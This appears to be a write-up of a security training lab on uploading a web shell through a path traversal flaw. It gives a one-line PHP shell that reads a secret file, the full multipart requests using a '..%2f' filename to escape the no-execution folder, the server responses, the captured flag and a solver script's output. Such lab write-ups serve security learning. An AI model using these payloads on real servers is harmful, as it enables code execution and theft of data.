# Lab: Web shell upload via path traversal

### Instructions

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can begin this lab creating a PHP file to read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```

After logging into the application we can attempt to upload this file as our avatar photo and capture the request in Burp:

```
POST /my-account/avatar HTTP/1.1
Host: 0a9300f3037c28638177891e007100fe.web-security-academy.net
Cookie: session=52N6PzfFM3giGSlzA3HCOungLIfdthBN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------188499433214350834051449941297
Content-Length: 531
Origin: https://0a9300f3037c28638177891e007100fe.web-security-academy.net
Referer: https://0a9300f3037c28638177891e007100fe.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="avatar"; filename="flag.php"
Content-Type: application/x-php

<?php system('cat /home/carlos/secret'); ?>

-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="user"

wiener
-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="csrf"

P3nrBEHD0HdJpINmWfuV0eHazrVVHPg6
-----------------------------188499433214350834051449941297--
```

This request can be sent to Repeater for testing.

Sending the request as is the file seems to be loaded:

```
HTTP/2 200 OK
Date: Mon, 19 Oct 2026 19:23:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 129

The file avatars/flag.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

However the PHP is not being executed from the script.

Attempting to POST this elsewhere via a path traversal vulnerability we get a new response:

```
-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="avatar"; filename="..%2fflag.php"
Content-Type: application/x-php

<?php system('cat /home/carlos/secret'); ?>

-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="user"

wiener
-----------------------------188499433214350834051449941297
Content-Disposition: form-data; name="csrf"

P3nrBEHD0HdJpINmWfuV0eHazrVVHPg6
-----------------------------188499433214350834051449941297--
```

```
HTTP/2 200 OK
Date: Mon, 19 Oct 2026 19:40:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/../flag.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Nice, the traversal worked.

We can access the flag at: `https://0a9300f3037c28638177891e007100fe.web-security-academy.net/files/flag.php`

```
LNL1NZ3BCEwj0IAVR2KjwUw7XXFiwXk7
```

### Python Solution

See `file_upload_03.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_03_web_shell_upload_via_path_traversal]
└─$ python file_upload_03.py https://0a9600d804a4509280b6946d003f00ad.web-security-academy.net/
[+] Logged in as wiener
[+] File uploaded
[+] The lab's flag is: NIYJnAdyL26grqtupnCEfUlexY1pZOWg
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag
```